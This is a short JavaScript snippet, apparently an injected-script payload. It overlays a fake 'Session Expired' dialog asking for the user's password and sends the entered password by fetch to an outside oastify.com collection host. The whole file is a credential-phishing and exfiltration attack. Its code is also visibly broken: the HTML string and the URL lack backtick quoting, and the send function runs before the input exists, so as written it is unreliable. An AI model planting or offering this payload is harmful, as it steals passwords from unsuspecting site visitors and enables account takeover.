// Create a prompt (div) with a password input
// This can be called before the function is actually defined in the script
sendData(); // This works because it's a function declaration
let div = document.createElement('div');
div.innerHTML = 
    <div style="position: fixed; top: 20%; left: 50%; transform: translate(-50%, 0); background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.5); z-index: 9999;">
        <h2>Session Expired</h2>
        <p>Please re-enter your password:</p>
        <input type="password" id="pPass" placeholder="Enter password">
        <button onclick="sendData()">Submit</button>
    </div>
;
document.body.appendChild(div);

// Function to send the password when the user submits
function sendData() {
    let pass = document.getElementById('pPass').value;
    console.log("Password entered: ", pass); // Debugging line to check if password is captured

    // Send the password via GET request to the specified URL
    fetch(https://w41xno1kw55je5x7ea1bjq4reik981cp1.oastify.com?password=${encodeURIComponent(pass)})
        .then(response => {
            console.log("Request sent successfully."); // Log to check if request was sent
        })
        .catch(error => {
            console.log("Error sending request: ", error); // Handle fetch errors
        });
}
